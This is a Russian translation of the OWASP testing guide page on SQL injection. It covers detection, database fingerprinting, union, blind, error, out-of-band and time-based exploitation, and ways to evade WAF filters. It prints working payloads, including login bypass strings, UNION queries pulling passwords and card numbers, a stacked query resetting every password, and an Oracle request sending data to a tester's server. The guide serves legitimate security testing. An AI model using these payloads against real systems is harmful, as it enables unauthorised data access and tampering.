# Тестирование для SQL Injection

| ID |
| ------------- |
| WSTG-INPV-05 |

## Резюме

Тестирование SQL-инъекций проверяет, можно ли вводить данные в приложение, чтобы оно выполняло управляемый пользователем запрос SQL в базе данных. Тестеры обнаруживают уязвимость SQL-инъекции, если приложение использует пользовательский ввод для создания SQL-запросов без надлежащей проверки ввода. Успешное использование этого класса уязвимости позволяет неавторизованному пользователю получать доступ к данным в базе данных или манипулировать ими.

An [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) атака состоит из вставки или «введения» частичного или полного запроса SQL через ввод данных или передачи от клиента (браузера) в веб-приложение. Успешная атака SQL-инъекций может считывать конфиденциальные данные из базы данных, изменить данные базы данных (вставить / обновить / удалить) выполнить операции администрирования в базе данных (такие как отключение СУБД) восстановить содержимое данного файла, существующего в файловой системе СУБД, или записать файлы в файловую систему, а также, в некоторых случаях, выдавать команды операционной системе. Атаки SQL-инъекций - это тип атаки-инъекции, при котором команды SQL вводятся во входные данные плоскости данных, чтобы повлиять на выполнение предопределенных команд SQL.

Как правило, способ, которым веб-приложения конструируют операторы SQL, включающие синтаксис SQL, написанный программистами, смешивается с предоставленными пользователем данными. Пример:

`select title, text from news where id=$id`

В приведенном выше примере переменная `$ id` содержит данные, предоставляемые пользователем, а остальная часть - статическая часть SQL, предоставляемая программистом; делая оператор SQL динамическим.

Поскольку способ его создания, пользователь может предоставить созданный ввод, пытаясь заставить исходный оператор SQL выполнять дальнейшие действия по выбору пользователя. Приведенный ниже пример иллюстрирует предоставленные пользователем данные "10 or 1=1", изменение логики оператора SQL, изменение WHERE пункт добавления условия "or 1=1".

`select title, text from news where id=10 or 1=1`

Атаки SQL Injection можно разделить на следующие три класса:

- Inband: данные извлекаются с использованием того же канала, который используется для введения кода SQL. Это самый простой вид атаки, при котором полученные данные представлены непосредственно на веб-странице приложения.
- вне полосы: данные извлекаются с использованием другого канала (например,., электронное письмо с результатами запроса генерируется и отправляется тестеру).
- Льготный или слепой: фактической передачи данных нет, но тестер может восстановить информацию, отправляя определенные запросы и наблюдая за возникающим поведением сервера DB.

Успешная атака SQL Injection требует, чтобы злоумышленник создал синтаксически правильный запрос SQL. Если приложение возвращает сообщение об ошибке, сгенерированное неправильным запросом, злоумышленнику может быть проще восстановить логику исходного запроса и, следовательно, понять, как правильно выполнить инъекцию. Однако, если приложение скрывает детали ошибки, то тестер должен иметь возможность перепроектировать логику исходного запроса.

О методах использования недостатков SQL-инъекций есть пять методов общего достояния. Также эти методы иногда можно использовать комбинированным образом (например,. профсоюзный оператор и вне полосы движения):

- Оператор объединения: может использоваться, когда недостаток SQL-инъекции возникает в операторе SELECT, что позволяет объединить два запроса в один набор результатов или результатов.
- Boolean: используйте логические условия, чтобы проверить, являются ли определенные условия истинными или ложными.
- На основе ошибок: этот метод заставляет базу данных генерировать ошибку, предоставляя злоумышленнику или тестеру информацию, на которой можно уточнить их ввод.
- вне полосы: метод, используемый для извлечения данных с использованием другого канала (например,., установить HTTP-соединение для отправки результатов на веб-сервер).
- Задержка времени: используйте команды базы данных (например,. сон), чтобы отложить ответы в условных запросах. Полезно, когда у злоумышленника нет какого-либо ответа (результата, вывода или ошибки) из приложения.

## Цели теста

- Определите точки инъекции SQL.
- Оцените серьезность инъекции и уровень доступа, который может быть достигнут через нее.

## Как проверить

### Методы обнаружения

Первым шагом в этом тесте является понимание того, когда приложение взаимодействует с сервером DB для доступа к некоторым данным. Типичные примеры случаев, когда приложению необходимо общаться с БД, включают:

- Формы аутентификации: когда аутентификация выполняется с использованием веб-формы, есть вероятность, что учетные данные пользователя проверяются по базе данных, которая содержит все имена пользователей и пароли (или, что лучше, хеши паролей).
- Поисковые системы: строка, представленная пользователем, может использоваться в запросе SQL, который извлекает все соответствующие записи из базы данных.
- Сайты электронной коммерции: продукты и их характеристики (цена, описание, доступность и т. Д.) Скорее всего будут храниться в базе данных.

Тестер должен составить список всех полей ввода, значения которых можно использовать при создании запроса SQL, включая скрытые поля запросов POST, а затем протестировать их отдельно, пытаясь помешать запросу и сгенерировать ошибку. Рассмотрим также заголовки и файлы cookie HTTP.

Самый первый тест обычно состоит из добавления одной кавычки `'` или точки с запятой `;` к тестируемому полю или параметру. Первый используется в SQL в качестве строкового терминатора и, если он не фильтруется приложением, приведет к неправильному запросу. Второй используется для завершения оператора SQL, и, если он не фильтруется, он также может генерировать ошибку. Вывод уязвимого поля может напоминать следующее (в данном случае на Microsoft SQL Server):

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

Также комментируют разделители (`--` or `/* */`, etc) и другие ключевые слова SQL, такие как `AND` и `OR`, могут использоваться для попытки изменить запрос. Очень простой, но иногда все еще эффективный метод - просто вставить строку, в которой ожидается число, так как может быть сгенерирована ошибка, подобная следующей:

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Контролируйте все ответы с веб-сервера и посмотрите исходный код HTML / JavaScript. Иногда ошибка присутствует внутри них, но по какой-то причине (например,. Ошибка JavaScript, комментарии HTML и т. Д.) Не представляется пользователю. Полное сообщение об ошибке, как и в примерах, предоставляет тестеру обширную информацию для успешной атаки на инъекцию. Однако приложения часто не предоставляют так много деталей: может быть выдана простая «500 Server Error» или пользовательская страница ошибок, что означает, что нам нужно использовать методы слепого впрыска. В любом случае, очень важно проверить каждое поле отдельно: только одна переменная должна изменяться, в то время как все остальные остаются постоянными, чтобы точно понять, какие параметры уязвимы, а какие нет.

### Стандартное тестирование SQL-инъекций

#### Классический SQL-инъекция

Рассмотрим следующий запрос SQL:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Аналогичный запрос обычно используется веб-приложением для аутентификации пользователя. Если запрос возвращает значение, это означает, что внутри базы данных существует пользователь с таким набором учетных данных, тогда пользователю разрешается войти в систему, в противном случае доступ запрещен. Значения полей ввода обычно получают от пользователя через веб-форму. Предположим, мы вставим следующие значения имени пользователя и пароля:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

Запрос будет:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

Если мы предполагаем, что значения параметров отправляются на сервер с помощью метода GET, и если домен уязвимого веб-сайта www.example.com, запрос, который мы выполним, будет:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

После короткого анализа мы замечаем, что запрос возвращает значение (или набор значений), потому что условие всегда истинно (`OR 1 = 1`). Таким образом, система аутентифицировала пользователя, не зная имени пользователя и пароля.

> Примечание. В некоторых системах первая строка таблицы пользователей будет пользователем администратора. Это может быть профиль, возвращенный в некоторых случаях.

Другой пример запроса:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

В этом случае есть две проблемы, одна из-за использования скобок, а другая из-за использования хэш-функции MD5. Прежде всего, мы решаем проблему скобок. Это просто состоит из добавления нескольких заключительных скобок, пока мы не получим исправленный запрос. Чтобы решить вторую проблему, мы пытаемся избежать второго условия. Мы добавляем к нашему запросу последний символ, который означает, что комментарий начинается. Таким образом, все, что следует за таким символом, считается комментарием. Каждая СУБД имеет свой собственный синтаксис для комментариев, однако общим символом для большинства баз данных является `/ *`. В Oracle символ `--`. Тем не менее, значения, которые мы будем использовать в качестве имени пользователя и пароля:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

Таким образом, мы получим следующий запрос:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(В связи с включением разделителя комментариев в `$username` значение парольной части запроса будет игнорироваться.)

URL-адрес запроса будет:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

Это может вернуть ряд значений. Иногда код аутентификации проверяет, что количество возвращенных записей / результатов точно равно 1. В предыдущих примерах такая ситуация была бы сложной (в базе данных есть только одно значение на пользователя). Чтобы обойти эту проблему, достаточно вставить команду SQL, которая налагает условие, что число возвращаемых результатов должно быть единым (одна возвращаемая запись). Чтобы достичь этой цели, мы используем оператор `LIMIT <num>`, где `<num> `- это количество результатов / записей, которые мы хотим вернуть. Что касается предыдущего примера, значение полей Имя пользователя и Пароль будет изменено следующим образом:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

Таким образом, мы создаем запрос, как следующее:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### SELECT Statement

Рассмотрим следующий запрос SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к сценарию, который выполняет запрос выше:

`http://www.example.com/product.php?id=10`

Когда тестер пробует действительное значение (например,. 10 в этом случае), приложение вернет описание продукта. Хороший способ проверить, уязвимо ли приложение в этом сценарии, - играть с логикой, используя операторы AND и OR

Рассмотрим запрос:

`http://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

В этом случае, вероятно, приложение вернет какое-либо сообщение, сообщающее нам, что нет доступного контента или пустой страницы. Затем тестер может отправить истинное утверждение и проверить, есть ли действительный результат:

`http://www.example.com/product.php?id=10 AND 1=1`

#### Stacked Queries

В зависимости от API, который использует веб-приложение, и СУБД (например,. PHP + PostgreSQL, ASP + SQL SERVER) может быть возможно выполнить несколько запросов за один вызов.

Рассмотрим следующий запрос SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Способ использовать приведенный выше сценарий будет:

`http://www.example.com/product.php?id=10; INSERT INTO users (…)`

Таким образом можно выполнить много запросов подряд и независимо от первого запроса.

### Отпечаток базы данных

Несмотря на то, что язык SQL является стандартом, каждая СУБД имеет свою особенность и отличается друг от друга во многих аспектах, таких как специальные команды, функции для извлечения данных, такие как имена пользователей и базы данных, функции, строка комментариев и т. Д.

Когда тестеры переходят к более продвинутой эксплуатации SQL-инъекций, им нужно знать, что такое бэк-энд-база данных.

#### Ошибки, возвращенные приложением

Первый способ узнать, какая бэкэнд-база данных используется, - это наблюдать за ошибкой, возвращаемой приложением. Ниже приведены некоторые примеры сообщений об ошибках:

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Один полный UNION SELECT с version () также может помочь узнать базу данных бэк-энда.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

Если нет сообщения об ошибке или пользовательского сообщения об ошибке, тестер может попытаться ввести в строковые поля, используя различные методы конкатенации:

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### Техника эксплуатации

#### Техника эксплуатации Союза

Оператор UNION используется в инъекциях SQL для соединения запроса, специально созданного тестером, с исходным запросом. Результат поддельного запроса будет присоединен к результату исходного запроса, что позволит тестеру получить значения столбцов других таблиц. Предположим, для наших примеров, что запрос, выполненный с сервера, является следующим:

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

Мы установим следующее значение `$ id`:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

У нас будет следующий запрос:

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Который присоединится к результату исходного запроса со всеми номерами кредитных карт в таблице CreditCardTable. Ключевое слово `ALL` необходимо для обхода запросов, использующих ключевое слово `DISTINCT`. Более того, мы замечаем, что помимо номеров кредитных карт мы выбрали два других значения. Эти два значения необходимы, потому что два запроса должны иметь равное количество параметров / столбцов, чтобы избежать синтаксической ошибки.

Первая деталь, которая необходима тестеру для использования уязвимости SQL-инъекции с помощью такой методики, - это поиск правильных чисел столбцов в операторе SELECT.

Для этого тестер может использовать предложение `ORDER BY`, за которым следует число, указывающее нумерацию выбранного столбца базы данных:

`http://www.example.com/product.php?id=10 ORDER BY 10--`

Если запрос выполняется с успехом, тестер может предположить, что в этом примере в операторе `SELECT` есть 10 или более столбцов. Если запрос не выполняется, запрос должен возвращать менее 10 столбцов. Если есть сообщение об ошибке, оно, вероятно, будет:

`Unknown column '10' in 'order clause'`

После того, как тестер узнает номера столбцов, следующим шагом будет выяснить тип столбцов. Предполагая, что в приведенном выше примере было 3 столбца, тестер может попробовать каждый тип столбца, используя значение NULL, чтобы помочь им:

`http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

Если запрос не удастся, тестер, вероятно, увидит сообщение типа:

«Все ячейки в столбце должны иметь один и тот же тип данных»

Если запрос выполняется с успехом, первый столбец может быть целым числом. Тогда тестер может двигаться дальше и так далее :

`http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

После успешного сбора информации, в зависимости от приложения, он может показывать только тестер первого результата, поскольку приложение обрабатывает только первую строку набора результатов. В этом случае можно использовать предложение `LIMIT` или тестер может установить недопустимое значение, сделав действительным только второй запрос (предположив, что в базе данных нет записи, идентификатором которой является 99999):

`http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### Логическая техника эксплуатации

Логическая техника эксплуатации очень полезна, когда тестер находит [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) ситуация, в которой ничего не известно о результатах операции. Например, такое поведение происходит в тех случаях, когда программист создал пользовательскую страницу ошибок, которая ничего не раскрывает в структуре запроса или в базе данных. (Страница не возвращает ошибку SQL, она может просто вернуть HTTP 500, 404 или перенаправить).

Используя методы вывода, можно избежать этого препятствия и, таким образом, преуспеть в восстановлении значений некоторых желаемых полей. Этот метод состоит из выполнения серии логических запросов к серверу, наблюдения за ответами и, наконец, определения значения таких ответов. Мы рассматриваем, как всегда, домен www.example.com и предполагаем, что он содержит параметр с именем `id`, уязвимый для SQL-инъекции. Это означает, что выполняется следующий запрос:

`http://www.example.com/index.php?id=1'`

Мы получим одну страницу с пользовательской ошибкой сообщения, которая связана с синтаксической ошибкой в запросе. Мы предполагаем, что запрос, выполненный на сервере:

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

Который можно использовать с помощью методов, описанных ранее. Мы хотим получить значения поля имени пользователя. Тесты, которые мы выполним, позволят нам получить значение поля имени пользователя, извлекая такое значение символ за символом. Это возможно благодаря использованию некоторых стандартных функций, присутствующих практически в каждой базе данных. Для наших примеров мы будем использовать следующие псевдофункции:

- SUBSTRING (текст, начало, длина): возвращает подстроку, начиная с позиции «начало» текста и длины «длина». Если «start» больше длины текста, функция возвращает нулевое значение.

- ASCII (char): он возвращает значение ASCII входного символа. Нулевое значение возвращается, если символ равен 0.

- LENGTH (text): возвращает количество символов во входном тексте.

Благодаря таким функциям мы выполним наши тесты на первом символе и, когда мы обнаружим значение, перейдем ко второму и так далее, пока не обнаружим все значение. Тесты будут использовать функцию SUBSTRING, для того, чтобы выбрать только один символ за раз (выбор одного символа означает наложение параметра длины на 1) и функция ASCII, для получения значения ASCII, так что мы можем сделать численное сравнение. Результаты сравнения будут выполняться со всеми значениями таблицы ASCII, пока не будет найдено правильное значение. В качестве примера мы будем использовать следующее значение для `Id`:

`$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

Это создает следующий запрос (с этого момента мы будем называть его «внутренним запросом»):

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

Предыдущий пример возвращает результат тогда и только тогда, когда первый символ имени пользователя поля равен значению ASCII 97. Если мы получаем ложное значение, мы увеличиваем индекс таблицы ASCII с 97 до 98 и повторяем запрос. Если вместо этого мы получаем истинное значение, мы устанавливаем ноль индекса таблицы ASCII и анализируем следующий символ, изменяя параметры функции SUBSTRING. Проблема в том, чтобы понять, каким образом мы можем отличить тесты, возвращающие истинное значение, от тестов, которые возвращают false. Для этого мы создаем запрос, который всегда возвращает false. Это возможно с помощью следующего значения для `Id`:

`$Id=1' AND '1' = '2`

Который создаст следующий запрос:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

Полученный ответ с сервера (то есть HTML-код) будет ложным значением для наших тестов. Этого достаточно, чтобы проверить, равно ли значение, полученное при выполнении логического запроса, значению, полученному при выполнении теста ранее. Иногда этот метод не работает. Если сервер вернет две разные страницы в результате двух одинаковых последовательных веб-запросов, мы не сможем отличить истинное значение от ложного значения. В этих конкретных случаях необходимо использовать определенные фильтры, которые позволяют нам удалять код, который изменяется между двумя запросами, и получать шаблон. Позже, для каждого выполненного ссылочного запроса мы будем извлекать относительный шаблон из ответа, используя одну и ту же функцию, и мы будем выполнять контроль между двумя шаблонами, чтобы определить результат теста.

В предыдущем обсуждении мы не рассматривали проблему определения условия завершения для наших тестов, т.е.когда мы должны закончить процедуру вывода. Методы для этого используют одну характеристику функции SUBSTRING и функции LENGTH. Когда тест сравнивает текущий символ с кодом ASCII 0 (т.е.значение null) и тест возвращает значение true, затем либо мы выполняем процедуру вывода (мы отсканировали всю строку), либо значение, которое мы проанализировали, содержит нулевой символ.

Мы вставим следующее значение для поля `Id`:

`$Id=1' AND LENGTH(username)=N AND '1' = '1`

Где N - количество символов, которые мы проанализировали до сих пор (не считая нулевого значения). Запрос будет:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'`

Запрос возвращает либо true, либо false. Если мы получим true, то мы завершили вывод и, следовательно, мы знаем значение параметра. Если мы получаем false, это означает, что нулевой символ присутствует в значении параметра, и мы должны продолжать анализировать следующий параметр, пока не найдем другое нулевое значение.

Слепая атака SQL-инъекций требует большого объема запросов. Тестер может нуждаться в автоматическом инструменте для использования уязвимости.

#### Техника эксплуатации на основе ошибок

Метод эксплуатации на основе ошибок полезен, когда тестер по какой-то причине не может использовать уязвимость SQL-инъекции, используя другой метод, такой как UNION. Метод, основанный на ошибках, заключается в том, чтобы заставить базу данных выполнить какую-то операцию, в которой результатом будет ошибка. Суть в том, чтобы попытаться извлечь некоторые данные из базы данных и показать их в сообщении об ошибке. Этот метод эксплуатации может отличаться от СУБД к СУБД (см. Конкретный раздел СУБД).

Рассмотрим следующий запрос SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к сценарию, который выполняет запрос выше:

`http://www.example.com/product.php?id=10`

Вредоносный запрос будет (например,. Оракул 10г) :

`http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

В этом примере тестер объединяет значение 10 с результатом функции `UTL_INADDR.GET_HOST_NAME`. Эта функция Oracle попытается вернуть имя хоста переданного ему параметра, который является другим запросом, именем пользователя. Когда база данных ищет имя хоста с именем базы данных пользователя, она не сможет и вернет сообщение об ошибке, например:

`ORA-292257: host SCOTT unknown`

Затем тестер может манипулировать параметром, переданным в функцию GET_HOST_NAME (), и результат будет отображаться в сообщении об ошибке.

#### Из техники эксплуатации группы

Эта техника очень полезна, когда тестер находит [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) ситуация, в которой ничего не известно о результатах операции. Техника состоит из использования функций СУБД для выполнения внеполосного соединения и доставки результатов введенного запроса как части запроса на сервер тестера. Как и методы, основанные на ошибках, каждая СУБД имеет свои функции. Проверьте для конкретного раздела СУБД.

Рассмотрим следующий запрос SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к сценарию, который выполняет запрос выше:

`http://www.example.com/product.php?id=10`

Вредоносный запрос будет:

`http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

В этом примере тестер объединяет значение 10 с результатом функции `UTL_HTTP.request`. Эта функция Oracle попытается подключиться к `testerserver` и сделает запрос HTTP GET, содержащий возврат из запроса `SELECT user FROM DUAL`. Тестер может настроить веб-сервер (например,. Apache) или используйте инструмент Netcat :

```bash
/home/tester/nc –nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### Техника эксплуатации с задержкой во времени

Техника эксплуатации с задержкой по времени очень полезна, когда тестер находит [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) ситуация, в которой ничего не известно о результатах операции. Этот метод заключается в отправке введенного запроса, и в случае, если условное значение истинно, тестер может отслеживать время, необходимое серверу для ответа. Если есть задержка, тестер может предположить, что результат условного запроса является истинным. Этот метод эксплуатации может отличаться от СУБД к СУБД (см. Конкретный раздел СУБД).

Рассмотрим следующий запрос SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к сценарию, который выполняет запрос выше:

`http://www.example.com/product.php?id=10`

Вредоносный запрос будет (например,. MySql 5.x):

`http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

В этом примере тестер проверяет, является ли версия MySql 5.x или нет, заставляя сервер отложить ответ на 10 секунд. Тестер может увеличить время задержки и отслеживать ответы. Тестер также не должен ждать ответа. Иногда он может установить очень высокое значение (например,. 100) и отменить запрос через несколько секунд.

#### Испытанная процедура Инъекция

При использовании динамического SQL в хранимой процедуре приложение должно надлежащим образом дезинфицировать пользовательский ввод, чтобы исключить риск введения кода. Если не дезинфицировать, пользователь может ввести вредоносный SQL, который будет выполняться в рамках хранимой процедуры.

Рассмотрим следующую хранимую процедуру SQL Server:

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Пользовательский ввод:

```sql
anyusername or 1=1'
anypassword
```

Эта процедура не дезинфицирует входные данные, что позволяет возвращаемому значению показывать существующую запись с этими параметрами.

> Этот пример может показаться маловероятным из-за использования динамического SQL для входа в систему пользователя, но рассмотрим запрос динамической отчетности, в котором пользователь выбирает столбцы для просмотра. Пользователь может вставить вредоносный код в этот сценарий и скомпрометировать данные.

Рассмотрим следующую хранимую процедуру SQL Server:

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Пользовательский ввод:

```sql
1 from users; update users set password = 'password'; select *
```

Это приведет к запуску отчета и обновлению паролей всех пользователей.

#### Автоматизированная эксплуатация

Большая часть ситуации и методов, представленных здесь, может быть выполнена автоматически с использованием некоторых инструментов. В этой статье тестер может найти информацию о том, как выполнить автоматический аудит с помощью [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)

### Методы уклонения от подписи SQL-инъекций

Методы используются для обхода защиты, такой как брандмауэры веб-приложений (WAF) или системы предотвращения вторжений (IPS). Также обратитесь к [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### Whitespace

Отбрасывание пространства или добавление пробелов, которые не влияют на оператор SQL. Например

```sql
or 'a'='a'

or 'a'  =    'a'
```

Добавление специального символа, такого как новая строка или вкладка, который не изменит выполнение оператора SQL. Например,

```sql
or
'a'=
        'a'
```

#### Нулевые байты

Используйте нулевой байт (%00) перед любыми символами, которые блокирует фильтр.

Например, если злоумышленник может ввести следующий SQL

`' UNION SELECT password FROM Users WHERE username='admin'--`

добавить Null Bytes будет

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### Комментарии SQL

Добавление встроенных комментариев SQL также может помочь оператору SQL быть действительным и обойти фильтр SQL-инъекций. Возьмите этот SQL-инъекция в качестве примера.

`' UNION SELECT password FROM Users WHERE name='admin'--`

Adding SQL inline comments will be.

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL кодирование

Используйте [online URL encoding](https://meyerweb.com/eric/tools/dencoder/) кодировать оператор SQL

`' UNION SELECT password FROM Users WHERE name='admin'--`

Кодировка URL оператора SQL-инъекции будет

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Character Encoding

Char() функция может использоваться для замены английского символа. Например, char(114,111,111,116) означает root

`' UNION SELECT password FROM Users WHERE name='root'--`

To apply the Char(), the SQL injeciton statement will be

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### String Concatenation

Concatenation разбивает ключевые слова SQL и уклоняется от фильтров. Синтаксис конкатенации варьируется в зависимости от движка базы данных. Возьмите MS SQL движок в качестве примера

`select 1`

Простой оператор SQL можно изменить, как показано ниже, с помощью конкатенации

`EXEC('SEL' + 'ECT 1')`

#### Шестигранное кодирование

Метод шестнадцатеричного кодирования использует шестнадцатеричное кодирование для замены исходного символа оператора SQL. Например, `root` может быть представлен как `726F6F74`

`Select user from users where name = 'root'`

The SQL statement by using HEX value will be:

`Select user from users where name = 726F6F74`

или

`Select user from users where name = unhex('726F6F74')`

#### Объявить переменные

Объявите оператор SQL-инъекции в переменную и выполните его.

Например, оператор SQL-инъекции ниже

`Union Select password`

Определите оператор SQL в переменную `SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Альтернативное выражение 'or 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

## Восстановление

- Чтобы защитить приложение от уязвимостей SQL-инъекций, обратитесь к [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
- Чтобы защитить сервер SQL, обратитесь к [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

Для общей безопасности проверки входных данных, обратитесь к [Input Validation CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

## Tools

- [SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [sqlbftools](http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html)
- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](http://sqlmap.org/)
- [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://github.com/dtrip/mysqloit)

## References

- [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

Technology specific Testing Guide pages have been created for the following DBMSs:

- [Oracle](05.1-Testing_for_Oracle.md)
- [MySQL](05.2-Testing_for_MySQL.md)
- [SQL Server](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL](05.4-Testing_PostgreSQL.md)
- [MS Access](05.5-Testing_for_MS_Access.md)
- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)
- [ORM](05.7-Testing_for_ORM_Injection.md)
- [Client-side](05.8-Testing_for_Client-side.md)

### Whitepapers

- [Victor Chapela: "Advanced SQL Injection"](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger: "SQL Injection Cheat Sheet"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Kevin Spett from SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) and "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)

### Documentation on SQL Injection Vulnerabilities in Products

- [Anatomy of the SQL injection in Drupal's database comment filtering system SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)
